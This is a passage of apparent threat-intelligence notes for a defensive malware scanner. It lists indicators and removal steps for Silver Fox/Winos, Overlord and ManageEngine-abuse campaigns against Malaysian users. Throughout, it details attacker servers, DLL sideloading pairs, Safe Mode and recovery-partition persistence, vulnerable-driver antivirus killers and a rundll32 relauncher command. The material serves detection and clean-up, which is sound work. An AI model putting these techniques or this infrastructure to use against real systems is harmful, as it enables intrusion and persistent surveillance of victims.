`cf111e28e40d20c9695e191c66b11882049c9559d5b4f2ed2090cf4626fdba39` (size unknown, not matched).
- VulcanRAT (Morphisec): driver `System32\drivers\tp_<tick>.tmp` (reported as a warning); SHA-256 `0c418989bbc836208a087dee8fd64210f58909dddf736bc94769c269f65c26eb`, `be740b05caead2fa4521f42da0653a10f53029df5455ebafe4701ab3d41afdf9`, `6833b1946ac219cf6ddf6cfbde1f81352b12d9125c8735961b5256216c4fdc49`, `cbf8ffe904a030c02b9def094f609b2c05a78fa5c7745d2d371d38dd460c58be`, `facf78d474b66ed821288db41fa6ad8a7b6f30650eb12127cb3e9a3cc6146116` (not on Triage, sizes unknown, not matched by hash).

## OBS libcef.dll sideload VHDX (sample sent to us, 30 Oct 2026)

- Lure `20261030C754FC89.zip` (22,776,198 bytes), SHA-256 `5f8e2cbb69fc774b1e770636729ea8ae2242b91f25a5b4818ff08965a49f0558`.
- Inside it, `20261030C754FC89.vhdx` (104,857,600 bytes), SHA-256 `13018ec3150e92eccb0ebfe8c1e2a47152d84bf50919987c753939c9b5e0f365`.
- The disk holds `20261030C754FC89.exe`, the real signed OBS Studio `obs-browser-page.exe` 32.2.2 (562,960 bytes, SHA-256 `3e82ef738e1b91bb99e4fb30948cbc4c2ae3b2e60e4b3f783ba6dd7da4b3ee08`, VirusTotal 0/74), and a hidden+system `libcef.dll` (47,764,992 bytes, SHA-256 `64002d80150dd9c6dc27cee586d12bc8144ba2ab11066eb67877cc10c1dddefc`). The DLL has no CEF exports and no Chromium strings, so it is not the real libcef.
- None of the three malicious files were on VirusTotal or Triage when found.
- Name pattern: `20YYMMDD` plus 8 hex characters.
- Triage run 261030-mn9zaayt7q (score 7): the program copies itself and the DLL to `C:\ProgramData\GYCAsi\`, writes `install.vbs`, `UEMSAgent.msi`, `UEMSAgent.mst`, `DCAgentServerInfo.json` and two root certificates to `C:\Windows\Tasks\`, then installs a ManageEngine agent that reports to `45.64.52.252:8383` (branch name "India"). The backdoor itself connects to `45.207.219.46:1011`.
- `install.vbs` SHA-256 `9bb1fc7af052fa22759101ec10e01c2e35ae7a83e30c7836cb7aa041df6dcaf4` (402 bytes), `UEMSAgent.mst` SHA-256 `180195558475b32abedb88b3103c06ee464148809986b78de32d8fdba897c516` (20,480 bytes).

## MyCERT MA-1491.102026 and MA-1493.102026 (Oct 2026)

- Signed hosts renamed as documents, each loading a fake DLL from its own folder: VLC 3.0.21 + `libvlc.dll`, Adobe Creative Cloud + `CRcliENT.dll`, ArphaSDK `arphaCrashReport.exe` + `ARPHADUMP.DLL`, UltraViewer + `msvbvm60.dll`, Rime/XiangLingHao + `rIME.dLl`, KuGou + `active_desktop_render_x64.dll`.
- ManageEngine builds drop a kit (`UEMSAgent.msi` 6.0.3 SHA-256 `92f68fc7f6d0f544a750bf67b4903d1a4062d1372b7f98ab5c2f698eb61359bb`, `UEMSAgent.mst`, `DMRootCA.crt`, `DMRootCA-Server.crt`, `DCAgentServerInfo.json`, `setup.bat`, `setup1.vbs`) in `C:\kouren`, `C:\cool`, `C:\ProgramData\Office05b5` or `C:\ProgramData\Office304ed3`, and plant a `CN=ManageEngineCA, O=Zoho Corporation` root certificate.
- Servers: `134.122.128.120:8383`, `134.122.155.183:8383` (UEMS consoles), `38.207.172.161`, `143.92.61.212:8871` (UltraViewer backdoor), `134.122.155.135:443`; domains `tttkkkssww.com`, `facai.mwkwnnn.click`, `www.cakkaao.com`, `www.fafadownload.com`, `ccc.fafadownload.com`, `caiwub.haccrt.top`.
- Lure names: `PDF_R6LWXF_20261009152217.zip`, `PDF_2MFVBJ_20260928010152.zip`, `PDF_0R-BEPZ_20260924110405.ZIP`, `20260922_145533_2153.iso`, `Financial_Report_20261008_PDF.44321142.zip`, `2026.10.06.zip`, `2026.10.14.zip`.
- Hashes matched by the scanner (size from VirusTotal): Sample B zip `9a6b0c60…`, `libvlc.dll` `67b6f787…`, Sample C zip `398e35fe…`, `CRcliENT.dll` `9c8a508b…`, `ARPHADUMP.DLL` `f8a5e09c…`, Sample E zip `d315ec62…`, `msvbvm60.dll` `508a83c0…`, Sample F image `e2bf8b7c…`. Not on VirusTotal, so not matched by hash: Sample A zip `20872aec…` and `rIME.dLl` `eb7a5ed5…`, Sample D zip `91501e4a…`, Sample F zip `9f2caeda…`.
- Kaspersky register (151 lure containers, in MA-1491): 143 had a size on VirusTotal and are matched by hash; 8 were not on VirusTotal. Name patterns from the register: `13211621092027.VHDX`, `36251322092026.71A.vhdx`, `CIT.Number.<14 digits>.IMG`, `I.T.R.Number-<14 digits>.IMG`, `IMPS_2121-9-2026.img`, `UTR_422-9-2026.7CA.vhdx`, `SOA3.IMG`, `E-statement2026.vhdx`, `20260827224326.DC40CD2841F6.zip`.
- Source: https://www.mycert.org.my/portal/advisory?id=MA-1491.102026 and https://www.mycert.org.my/portal/details?menu=431fab9c-d24c-4a27-ba93-e92edafdefa5&id=437b1ce7-4a9a-4c38-a740-cb0f0a3b7945

## TankRAT / Overlord RAT (LHDN and finance lures, Oct-Nov 2026)

Sources: amirulcyber.com (2 Nov 2026), NetbyteSEC (28 Oct 2026), @bomccss on X (Japan, Sep 2026), the open-source Overlord client code, and Triage (`family:overlord`).

- Delivery: WhatsApp zips (`Penyata Akaun_2026_D2871820980_2026-10-13.zip`, `Notis_Penalti_S112_LHDN_D1243125560_2026.zip`, `UnkLown_D2302767703_2026.zip`, `SENARAI DOKUMEN2/3/5.zip`, `CP14_Increase_Tax_2025_D6584623300_2026-10-12.zip`) and fake LHDN pages (hasilgov-my.shop, hasil-gov-my.shop, hasilgov-my.my.id, mida.cam, midaoity.my, mhftee.my.id, wwcvda.my.id, satgob-mx.shop on 103.97.131.121). Most names carry `_D` or `_C` plus 10 digits.
- Sideload pairs: Microsoft-signed `topoedit.exe` (1688fe46..., 0/71 on VirusTotal) + fake `tedutil.dll`; Glorylogic True Burner (e0ee8df4...) + fake `badata_x64.dll`; Japanese arm: exe + `event.dll` (DonutLoader).
- Loader persistence: hidden `%LOCALAPPDATA%\Microsoft\Windows\Explorer\thumbcache_<8>\` with `ExplorerBroker.exe` (renamed topoedit), `tedutil.dll` and `settings.dat` (encrypted payload); Run value `WindowsUpdate_<4>`. The loader hollows a `RuntimeBroker.exe` it starts itself (no `-Embedding`).
- Second stage: `github.com/mariauyrnq/devin-update/releases/download/v1.0.01/devin-us.dat` (568 downloads by 3 Nov 2026). `devin-update-v23` is gone and `server-update` was emptied on 1 Nov 2026. C2/panel: devin-us.com (103.59.101.28), fileserver.devin-hk.shop (85.137.60.92); Japan lure mjdou.vip (149.104.24.197).
- Overlord client defaults (source code): `%APPDATA%\Microsoft\DeviceSync\ovd_<12 hex>.exe` (hidden folder), Startup `ovd_<12 hex>.exe`, Run `OverlordAgent-<8 hex>`, task `ovd_<8 hex>`, WMI `ovd_f<8 hex>` / `ovd_c<8 hex>`, mutex `Global\Overlord-<key>`, hidden desktop `OverlordBackstage`, plugins in `%LOCALAPPDATA%\Overlord\plugins`, temp files in `%TEMP%\Overlord*` and `%TEMP%\ovld_*`.
- WinRE hook: files in `C:\Recovery\OEM\` (two 20-character .bat files, a stub exe, a changed `ResetConfig.xml`, and `XRSBackupData\DELETEME` / `configBackup`) put the RAT back after "Reset this PC". The tool moves the listed files out and restores `configBackup`.
- Overlord can mark itself a critical process; killing it blue-screens Windows. The tool checks this and leaves such a process for the restart.
- Hashes are in `$KnownBad`; the two signed hosts are in `$AbusedLegit` (flagged outside their real install folders).

## TBK lure: renamed Edge helper plus fake dbghelp.dll (sample sent to us, 4 Nov 2026)

- Lure `TBK20261104_9635.zip` (2,175,525 bytes), SHA-256 `8c4b1f299600584aecfec60750ac461e20d58a5dee207c40a8a9258b0e3a5595`. Not on VirusTotal when found.
- `TBK20261104.exe` is the real Microsoft Edge `notification_helper.exe` (2,812,400 bytes, SHA-256 `86cc4d3f1c4aaeb8f1d94087161f17f20abb136c5e653f6f2349f32c2f0a5e92`, VirusTotal 0/75). VirusTotal also lists it as `TBK-20261103.exe` and `TBK1700_261102.exe`.
- `dbghelp.dll` (1,869,312 bytes), SHA-256 `a490e729feafaee29873331fbaab9b653c7e1285a3e93b21653520559c210adc`, VirusTotal 2/75 (trojan.sideloader). The program loads it from its own folder instead of System32.
- Name pattern: `TBK` plus 4 to 8 digits, sometimes with `-` or `_digits`.

## ManageEngine + IP-guard chain (Malaysia victim, Nov 2026)
From one victim's PC, collected with the owner's permission (agent logs, registry and folder listings; no samples).
- 2026-10-09 ~16:40 (UTC+8): attacker's ManageEngine Endpoint Central (UEMS) agent installed. Server `27.124.41.218` (`DCServerIPAddress`), server name `WIN-NIK9N0SF4IH`, ports 8383 (HTTPS) and 8443 (remote-control WebSocket). Still answering on 2026-11-05.
- The attacker pushed a ManageEngine "Prohibited Software" policy that ran `dcuninstallsw.exe` repeatedly (12 Oct to 4 Nov). `MEARWService` blocked stopping and removal even for an administrator; the tool's Safe Mode auto run removed it.
- 2026-10-12 08:05-08:18: ManageEngine dropped the IP-guard / OCular agent (TEC Solutions): installer folder `C:\ProgramData\Ocular\IPGASKERNEL<timestamp>\AKernel3.exe`, work folder `C:\Windows\SysWOW64\Ocular` (`OAgent.ini`, `OPolicy.ini`, `Screen`, `Mails`, `BroHistory`, `Winscap` SSL/SSH capture, `TSafeDoc`), process `wrdlv4.exe` (System32 and SysWOW64), `IPGuDll.dll`, `OAgentInfoEx.exe`, `SDGuarder.exe`, `sdhelper2.exe`, `winoav3.dll`, `winscap64.dll`, about 200 more DLLs in System32/SysWOW64.
- IP-guard server `27.124.41.182`, from `OAgent.ini` `SIP=B6297C1B` (4 bytes, last byte first). Same /24 as the ManageEngine server.
- IP-guard kernel drivers (created 2026-10-12): `THlpDrv64.sys` (service `THlpDrv`, group `.OcularService`, LOLDrivers vulnerable `thelper.sys`), `TSDDrv64.sys`, `TsdEncrypt.sys`, `TsdEncryptMF.sys`, `TsdLogDrv.sys`, `TSecBxFltMF.sys`, `tfsfltdrv.sys`, `TFsdframe.sys`, `TIjtDrv64.sys`, `TPacket7.sys`, `tpacketv.sys`, `tnfcap.sys`, `TNullFilter.sys`, `TProbeDrv.sys`, `TWfpFrame.sys`, `tvdisk.sys`, `ipnpf.sys`; plus `bakdevctrl64.sys`, `bakrdgv3.sys`, `bakstec3.sys` in SysWOW64.
- Removal that worked on that PC (no reinstall): while Windows runs, IP-guard puts back changed service start values and re-adds its service `.Winhlpsvr` under `SafeBoot\Minimal` and `SafeBoot\Network`. Blocking `27.124.41.0/24`, deleting those two Safe Mode entries just before a restart, then in Safe Mode setting `Start=4` on its services (`.Winhlpsvr` -> `Common Files\System\winrdgv3.exe`, `TFsdframe`, `TFsfltdrv`, `THlpDrv`, `TIjtdrv`, `TNullFilter`, `TSafeDisk`, `TsdEncrypt`, `TsdEncryptMF`, `TVDisk`) and moving its files out, left a clean scan. Its network filters `TNFCAP` and `tpacket7` were unbound with `netcfg -u` in normal Windows first. The tool now does this with -Fix plus its Safe Mode auto run; the file list is `$IpgFileNames` in the script.

## ManageEngine kit in Caches + Toolkit.exe sideload (second Malaysia victim, Nov 2026)
From a second victim's PC (folder listing, `DCAgentServerInfo.json` and `Get-FileHash`; no samples collected).
- Both folders were Windows Defender exclusions: `%LOCALAPPDATA%\Microsoft\Windows\Caches\<name>` and `%LOCALAPPDATA%\Toolkit`.
- `Caches\<name>` held the ManageEngine installer kit (`UEMSAgent.msi`, `DCAgentServerInfo.json`, scripts). `DCAgentServerInfo.json`: server `156.234.7.51`, port 8383 (HTTPS), server name `WIN-QMO1HP9BSRQ`, agent 11.3.2400.33.W. VirusTotal: 0 detections, owner Yancy Limited (HK).
- `%LOCALAPPDATA%\Toolkit\Toolkit.exe` is a validly signed Gaggle Studios program (SHA-256 `72f3453ffe9e97358840cb51fb9ca49648405bb8969b6d1ca8fbe1edf53148fb`, VirusTotal 0/75), used only as a host: it loads `unityplayer.dll` from its own folder. Not flagged by hash.
- `unityplayer.dll` SHA-256 `67731346556f1e8921d0be0f346315298c5d683160a5d7cd906e02cc276e108e`, `UX64` SHA-256 `9af5d2aa96fae12f4e374523c02f0579002c63964b0114d2cc79782e9412b33f`. Neither is on VirusTotal. Sizes not known, so the tool matches these hashes by file name.
- Toolkit.exe was running. A root scheduled task `WindowsUpdateSync` started it from `AppData\Local`.

## Chinese remote-control / monitoring vendors, matched by code-signing company (Nov 2026)
Programs from these companies are WARN (AMARAN) wherever they run, even renamed; HIGH (BAHAYA) when the program is connected to a known attacker server. Only remote-control or staff-monitoring vendors are listed; other Chinese software (WeChat, WPS, Huorong, Lenovo, Xiaomi) is not.
| Vendor / product | Signer subject matched | Source |
|---|---|---|
| IP-guard / OCular (TEC Solutions) | `Guangzhou TEC Solutions Co., Ltd.`, `T.E.C Solutions (G.Z.)Limited` | VirusTotal `signature_info` of the binaries from the Nov 2026 Malaysia victim (e.g. `wrdlv4.exe` 7db962200026c0afa923f559d2155a2a27b7a026553c9ca24e3dee1ec81e395d, `THlpDrv64.sys` 7e783b0a0ff4710306bb3bca29296cf962ae77abc81245a99f12a9039158226f) |
| ToDesk (Hainan YouQu Technology) | `Hainan YouQu Technology Co., Ltd` | VirusTotal `signature_info` of ToDesk 4.7.4.3 installer fb3fd77cbb36aba970e2b419b826c8f3ad6fe629b6ee9dd87896971bec1612ce (hash from winget-pkgs `Youqu.ToDesk`) |
| Ping32 (Shandong Anzai / NSecsoft) | Chinese company name `山东安在信息技术有限责任公司` (or `Shandong Anzai`) | QiAnXin RedDrip, signer of the NsecRTS.exe agent abused by a crime group: https://ti.qianxin.com/blog/articles/genuine-surveillance-software-used-by-hackers/ ; Netresec, Ping32 in the WhatsApp VBS campaign: https://www.netresec.com/?page=Blog&month=2026-06&post=Ping32-RMM-and-ValleyRAT |

Opt-in report WAZ-4DX9C (7 Nov 2026), office PC with the attacker's ManageEngine, UltraViewer and `C:\cool` kit: IP-guard (OCular, driver `THlpDrv`/`thelper.sys`) reporting to `134.122.155.188`, in the same /24 as attacker servers `134.122.155.135`/`.148`/`.183`. An IP-guard server in the /24 of any known attacker server is now treated as the attacker's, even on an office PC. Same PC: WeChat's video player plugin (`Tencent\xwechat\XPlugin\Plugins\WeChatPlayer\...\libvlc.dll`, VT 0/74) was a false positive of the libvlc sideload rule; the rule now needs a program in the same folder and skips that plugin.

Phishing e-mails that install remote-control tools (Microsoft Security Blog, 29 Sep 2026, https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/): lures such as `VIP_ECARD_INVITATION_rmm_v2.5.0.67_*.exe`, `ZoomSetup_Installation_v2.5.0.67_*.exe`, `RSVP_INVITATION_E_CARD_rmm_v2.5.0.67_*.exe` install MSP360 RMM (`C:\Program Files\RMM Agent\RMM.Agent.exe`, `RMM.Agent.Launcher.exe`) or Faronics Deploy (`FaronicsDeployAgent.exe`), which then installs ScreenConnect. Both agents are warnings by file name. ScreenConnect relay domains (warning when in the DNS cache): `adswre.cfd`, `trews.cfd`, `adsaw.cfd`, `swedcorry.stefneyv.com`, `ojsuyw.niyari.org`, `bunstar.harej.si`, `sdfghj.rd-team.ru`. MSP360 installer SHA-256 `108ef7e628d7a20bd6241a5b57149e27a6061f467123eb64061975559f8f73dc` (signed, legitimate; not matched by hash).

Also added by file name (LOLRMM): AnyViewer (`AnyViewer.exe`) and AweSun / AweRay (`AweSun.exe`, `aweray_remote*.exe`).
Left out: AOMEI as a signer (it also signs AOMEI Backupper and Partition Assistant, common legit tools; AnyViewer is matched by name instead); Sunlogin / Oray (already matched by name; no signer subject we could confirm from a known hash).

## Fake FilmoraTray + UltraViewer (third Malaysia victim, Nov 2026)
From the tool's scan output on a third victim's PC (screenshots; no samples or hashes collected).
- `FilmoraTray` running from the Wondershare Filmora folder and loading a fake `libvlc.dll` from that folder (DLL sideloading, same pattern as the VLC + `libvlc.dll` host in MyCERT MA-1493). It came back once with a new process ID after the first clean-up; after a second clean-up and a restart it did not return.
- Start Menu shortcut named like a real program ("V-Ray Swarm UI") that runs a hidden command; caught by the SORVEPOTEL-style shortcut check.
- Two lure ZIPs from WhatsApp (Downloads and Desktop; the Desktop one named as a construction-industry certificate) and six WhatsApp Web sessions in Chrome.
- UltraViewer installed without the owner's knowledge. Since v2026.11.05.16 the tool always removes UltraViewer (service, process, folder, Apps entry); AnyDesk and TeamViewer stay warnings.

## IP-guard surviving the first Safe Mode pass (fourth Malaysia victim, Nov 2026)
From the tool's scan logs and registry queries on a fourth victim's PC.
- IP-guard agent `wrdlv4.exe` ("OCular Agent") connecting to `137.220.205.162` (already listed above as a ManageEngine agent server on port 8383); Malwarebytes on the PC blocked the connection.
- Tool v2026.11.05.18 deleted the `.Winhlpsvr` SafeBoot entries, then waited 3 seconds before restarting; IP-guard re-added them in that time. In Safe Mode `winrdgv3.exe`, `systecv3.exe` and `winwdgsvr.exe` were still running ("Access denied" on move) and its services were still enabled (`.Winhlpsvr Start=2`, `TsdEncrypt Start=0`).
- Fixed in v2026.11.05.19-.21: delete the SafeBoot entries repeatedly until Windows shuts down; in Safe Mode stop processes, set `Start=4`, delete services, then move files; at most 2 Safe Mode rounds, then `BUANG.bat` for the recovery Command Prompt. The next run cleaned the PC without a reinstall.
- Case write-up: [`docs/reports/2026-11-malaysia-four-pcs.md`](docs/reports/2026-11-malaysia-four-pcs.md).

## Reconciliation Invoice lure (opt-in report, Nov 2026)
From an opt-in report sent by the tool (Windows Defender history on the PC; no file or hash available).
- `Reconciliation Invoice.zip` holding `4.img`. Defender flagged the image as `Trojan:Win32/Malgent` on 2026-11-05, in the temporary folder Explorer uses when a file is opened straight from a ZIP.
- Same PC, 2026-11-03: Defender flagged `D:\is.dll` as `Trojan:Win32/Wacatac.C!ml`. `D:` was most likely an earlier lure image opened as a drive.
- The tool found nothing left running or set to start. The name pattern `Reconciliation Invoice*.zip|img|iso|vhd(x)` is HIGH since v2026.11.05.25. From that version, reports also carry the SHA-256 and size of every file found (never the file itself).
- Indonesian-language variant (second opt-in report, Nov 2026): `Rekonsiliasi Akun.zip` (3,913,007 bytes), SHA-256 `97ca10750526e7026bc65cb77d71afd47312834080ad991f385e883506198cc3`, holding `Memeriksa.vhd` (32,506,368 bytes), SHA-256 `cf8ee9652aa18d5f2326669c7e392a137966ef3200e11847b4752900c241148b`. The VHD was opened straight from the ZIP (Explorer unpack folder in Temp). Neither hash is on VirusTotal. The name pattern `Rekonsiliasi Akun*.zip|img|iso|vhd(x)` and both hashes are HIGH since v2026.11.06.30.

## Notis Denda lure, MicroPoint chain renamed Virtual_Linux (opt-in report, Nov 2026)
From an opt-in report sent by the tool (scan log, Windows event 7045, Program Compatibility records, Prefetch, `Get-FileHash`; no sample).
- Lure `Notis Denda.zip` holding `Notis Denda.vhd` (12,583,424 bytes), SHA-256 `7173bd2d0f2f17b2fd1e71ba09a9bd03807b3af188dae725bb5c2606781bf620`. Not on VirusTotal (404 on 2026-11-05). Opened straight from the ZIP (Explorer unpack folder in Temp).
- 2026-11-05 19:51:31: driver service `MSDRIVER1005` installed, image `C:\ProgramData\Virtual_Linux\Security_Module.dat`.
- `C:\ProgramData\Virtual_Linux\WinCombo.exe` ran the same day; HKLM Run value `AutoStart` starts it. Winos4.0 module in `HKCU\Console\1`. Windows Update and the UAC prompt switched off.
- Same file names as the MicroPoint chain (`WinCombo.exe`, `Security_Module.dat`) under a new folder name. Since v2026.11.05.29 the tool flags any ProgramData folder holding those files, any service loaded from a `.dat`-style file in ProgramData or a user folder, a VHD unpacked from a ZIP opened directly, and the `Notis Denda*` name.

## MYS2026C lure VHD, payload left in Temp after two clean-ups (opt-in report, Nov 2026)

- Lure ZIP `MYS2026C<nnn>V<xxx>.zip` opened straight from WhatsApp; Explorer unpacked it to `Temp\<guid>_<name>.zip.<name>.zip\<name>.vhd` (14,716,928 bytes), SHA-256 `5a08a4196574ef2ff72c103104a23a0f5c27475d678fc847d80f0e2ebae5ae93`. Not on VirusTotal (404 on 2026-11-06).
- Hidden+System `Temp\hs_rt32_<hex>.dll` (638,313 bytes), SHA-256 `c163f979d5dec3a40b7f14ef03b4ca9af62d785c615568f1e08de5af321f4386`. Not on VirusTotal.
- Encrypted payload `Temp\hs<hex>\eneio64.dat` (18,713 bytes), SHA-256 `18db96354a00c1be908e4f3faebe7ab51e83d7e3342124bb7cacc5dbf7856d1a`. Not on VirusTotal.
- Antivirus-killer drivers dropped in Temp and loaded as services `PEx7772` and `BOOTREPAIR`: `pex7772.tmp` = ardrv.sys (17,744 bytes), SHA-256 `f130c20c0e4f1bf184514efc658c4bdcccba4816204426ef0eead0ff77acc516` (VirusTotal 7/75); `KV37F60000.sys` = BootRepair.sys, a vulnerable Lenovo driver (30,320 bytes), SHA-256 `eb57b6db9b6876a51c7bc05ef011adcf0909a7351da8a329d6a1aee52a286459` (VirusTotal 9/75).
- More antivirus-killer drivers sent as opt-in samples (Nov 2026): ardrv.sys build 3, the signed OPSWAT AppRemover driver (17,224 bytes), SHA-256 `9f326ede322930a7d5e149fa8720802b0623c1972dc54e41a2a73608fb6810dd` (VirusTotal 5/75), reinstalled 1,669 times in four hours from a `C:\ProgramData\_<symbols>\` folder; MonProcess.sys, a signed Honor driver (57,576 bytes), SHA-256 `72d0b5615b996cbb01b1ca139e627079094f734da48a0435ffd8480a25d0a258` (VirusTotal 24/75), dropped in Temp as `KV<8 hex>.sys` beside `dcrcvdrv.sys`.
- Persistence: a Run value `MicrosoftTokenBroker` starting a Hidden+System `RuntimeBroker.exe` in `AppData\Local\{<guid>}\`.
- The VHD and the DLL were only warnings, so they survived a Safe Mode pass and a later clean-up, and the payload was running again after the restart. Since v2026.11.06.34 any file under `Temp\<guid>_<name>.zip<anything>\` with a .vhd/.vhdx/.iso/.img name, and any Hidden+System program in Temp, is HIGH and quarantined; the name pattern `MYS20<yy>C<nnn>V<xxx>` and all five hashes are matched.
- Second clean-up on v2026.11.06.34 (victim screenshots, same PC): the loader came back after each run, because only its process and Run value were removed. The loader is a Hidden+System `RuntimeBroker.exe` plus Hidden+System `QtsVFS.dll` in `AppData\Local\{<guid>}\`, started by the Run value `MicrosoftTokenBroker`. Within minutes of a clean-up it dropped new drivers (`Temp\KV<hex>.sys` = BootRepair.sys as service `BOOTREPAIR`, `Temp\pex<nnnn>.tmp` as service `PEx<nnnn>`) and a new `Temp\hs<hex>\eneio64.dat`; one PC had 16 `KV<hex>.sys` copies. Since v2026.11.06.35 the program file and the whole `{<guid>}` folder of a malware process are quarantined after the kill, every path in a Run/task line (including the DLL after rundll32/regsvr32) is checked, a Hidden+System program in `AppData\<Local|Roaming|LocalLow>\{<guid>}\` is HIGH, and a `Temp\hs<hex>\` drop folder goes as one unit. Since v2026.11.06.36, when a clean-up finds the same kind of thing again (a malware process, an antivirus-killer service, or a Run value at a Hidden+System file) after an earlier clean-up by this tool, or finds the loader running together with an antivirus-killer driver, it quarantines what it can online and then restarts into Safe Mode by itself to finish while the loader is not running. A later report from the same PC (WAZ-EU5BG) showed the relauncher: scheduled task `\MicrosoftTokenBroker` (created minutes after a clean-up) running `C:\Windows\System32\rundll32.exe <AppData\Local\{<guid>}>\QtsVFS.dll,VFS_Initialize`. Since v2026.11.06.37 a task that runs rundll32/regsvr32 on a DLL under AppData, Temp, ProgramData or Users\Public (not signed by Microsoft) is HIGH and removed, with the DLL's folder.

- Quarantine folder from the same PC (victim's own copy, Nov 2026; hashed only, never run). After v2026.11.06.37 the clean-up found six loader folders `AppData\Local\{<guid>}\`, each holding the same five files:
  - `RuntimeBroker.exe` (200,704 bytes), SHA-256 `0030eb685d66a1624681cb307320c91644390f6f7b2701c79e46762b78508c2a`. VirusTotal 45/75, trojan.agentagen.
  - `QtsUpdater.exe` (390,696 bytes), SHA-256 `f7444fa5e949408e2bfb328a17acf0ea3316570a33e0bbca27b934e551af5b8b`. VirusTotal 0/75; likely a clean host program used for sideloading.
  - `crypt_base.dll` (20,992 bytes), SHA-256 `26c6313b7cb49d8150dab9274642ce39fc1a7124915371f1529adbc6c4ffa6fd`. VirusTotal 1/75.
  - `_plcache.dll` (about 638.5 KB): a different hash in every folder. Example SHA-256 `14ad6848e63ac6673b6afd7aedcf979aa0b30daa7c1addf19a988a2b33e1adfd`, VirusTotal 29/75, trojan.stealer (coins). The others: `244c1b96bd9207b4b5f7401048eda40bcc6306a1249b907e8ab1a626ea0239fc`, `3b014585432583025e724a74e0ef26332c32678f9c779581d937a5e4afcfe96a`, `4745e11b5f231d447982963b393fbd76dc877556f4a6cda12751364053cfa8b9`, `53e0856e13907e3d2e1ee55af1e81cb41d3409fb8d94774e4eee507dc2aeb27a`, `77910243121b3110bc7531dc706d7b396aba60f51201d131b29c0f44e8c71c26`.
  - `QtsVFS.dll` (about 1.99 MB): a different hash in every folder, none on VirusTotal: `0341bd8a576f97e519a6b6b44dfd65d172257d1811a25131adf6c343ea2faa6b`, `29fa6c72f4b1751554465cdc13f4b24f6819978748e1a32601c74c12f9931aea`, `2da163e718d233a910a5dd1490582d20d929a689148fffaf4bd7ea1542258200`, `7d36c3e092e7d483a8b8ae9b3aef14785cfb7b82ebcc51483eadacb5e62dd4cc`, `998326ffa480786fff4ab6d8f78f852555cf8e668ede7059a73dd37f06dcf0ab`, `b4ad326af544024f1a911c7d20239668979521e7c594bab6b160865f0c217643`.
  - Because `QtsVFS.dll` and `_plcache.dll` change per folder, hash matching does not work for them; the tool matches the folder shape instead.
- The same PC had two attacker root certificates, `CN=ManageEngineCA` (thumbprint `7F611B3116BA141088B08687E329C40AE55ECDF0`) and `CN=ManageEngineCA-DS-CA` (thumbprint `360DC5F5B39655F5774C01CF5D96DB8B849EFDF6`), both `O=Zoho Corporation` and valid from 2026-08-18. The tool already removes any `CN=ManageEngineCA` root.

## Hiding folders, service-install history and ManageEngine leftovers (14 opt-in reports, Nov 2026)
From opt-in reports sent by the tool (Windows event 7045 history, scheduled tasks, driver file version info; no samples, no victim data kept).
- Driver services installed again and again (the `ardrv` BYOVD driver) from folders under `C:\Users\Public\Libraries\` whose names are strings of symbols, and from extensionless files in `C:\Windows\System32\drivers\`. Since v2026.11.06.31 any 7045 service image in `Public\Libraries`, in a folder named with six or more symbols, or an extensionless file in `System32\drivers` is HIGH, even when the service is already deleted. The whole folder is quarantined as one unit, with its processes, tasks, services and Run values.
- ManageEngine Endpoint Central leftovers installed seconds after the agent: services `uesAgentService` and `NotifDriver` (under `ManageEngine\UEMS_Agent`), filter drivers `DCFAFilter` and `MEARWFltDriver`, tasks `DCAgentUpdater` and `UEMSLogCollector`. `DRMFilter`/`DFMFilter` are only removed when the driver file says Zoho, ManageEngine or AdventNet. ManageEngine installed within an hour of a flagged 7045 service is HIGH.
- Plain WhatsApp document zips (for example school or office paperwork) were being quarantined. Since v2026.11.06.31 a zip is HIGH only when it holds a program, script or disk image, or matches a known lure name or hash; otherwise it stays a warning and is left in place.

## References

- CloudSEK, Silver Fox targeting India using tax-themed phishing lures (2025-12-24): https://www.cloudsek.com/blog/silver-fox-targeting-india-using-tax-themed-phishing-lures

- Kaspersky Securelist, Silver Fox uses the new ABCDoor backdoor (Apr 2026): https://securelist.com/silver-fox-tax-notification-campaign/119575/

- LOLDrivers, vulnerable and malicious driver list used by the scanner (`data/loldrivers.csv`): https://www.loldrivers.io
- LOLRMM, remote-management tools abused by attackers: https://lolrmm.io
- Elastic YARA rule for Winos (Elastic License 2.0, linked not copied): https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Winos.yar
- @a.xydiel on Threads, 22 and 24 Oct 2026: https://www.threads.com/@a.xydiel/post/DeyKrHwk2D6 and https://www.threads.com/@a.xydiel/post/De4hGk6E7sg
- Pelagos Intel, SilverFox in the Desktop (2026-09-27): https://research.pelagos-intel.com/silverfox-in-the-desktop
- eSentire, Winos4.0 online module staging component: https://www.esentire.com/blog/winos4-0-online-module-staging-component-used-in-cleversoar-campaign
- amirulcyber.com, Malaysia LHDN tax-audit impersonation (2 Nov 2026): https://amirulcyber.com/2026/11/02/malaysia-lhdn-tax-audit-impersonate/
- NetbyteSEC, Malaysian WhatsApp phishing wave delivers Overlord (28 Oct 2026): https://notes.netbytesec.com/2026/10/malaysian-whatsapp-phishing-wave.html
- The Star, 29 Sep 2026: https://www.thestar.com.my/tech/tech-news/2026/09/29/malaysians-report-being-targeted-by-malware-file-sent-through-whatsapp
